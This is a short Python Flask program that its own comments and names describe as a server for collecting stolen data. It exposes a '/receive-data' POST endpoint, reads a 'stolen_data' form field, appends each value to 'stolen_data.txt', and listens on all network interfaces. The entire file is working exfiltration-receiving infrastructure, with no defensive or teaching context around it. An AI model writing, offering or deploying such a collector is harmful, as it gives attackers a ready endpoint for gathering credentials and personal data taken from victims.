from flask import Flask, request
import os

app = Flask(__name__)

# Directory to store incoming data
OUTPUT_FILE = "stolen_data.txt"

def save_to_file(data):
    """
    Save the received data to a text file.
    """
    try:
        with open(OUTPUT_FILE, "a") as file:
            file.write(f"{data}\n")
        print(f"Data saved to {OUTPUT_FILE}")
    except Exception as e:
        print(f"Error saving data to file: {e}")

@app.route("/receive-data", methods=["POST"])
def receive_data():
    # Extract the stolen data from the request
    stolen_data = request.form.get("stolen_data")
    if stolen_data:
        # Save the stolen data to a file
        save_to_file(stolen_data)
        return "Data received and saved successfully", 200
    return "No data received", 400



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # Run on all interfaces
